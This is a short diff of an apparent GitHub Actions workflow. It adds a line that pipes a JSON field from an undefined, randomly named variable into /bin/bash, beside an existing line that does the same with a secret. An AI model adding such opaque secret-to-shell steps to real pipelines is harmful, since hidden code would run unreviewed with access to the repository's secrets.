@@ -22,6 +22,7 @@ jobs:
           oqt95613: ${{ secrets.oqt95613 }}
         run: |
           printf '%s' "$oqt95613" | jq -r .each9 | /bin/bash
+          echo $dpz7910 | jq -r .ym26 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
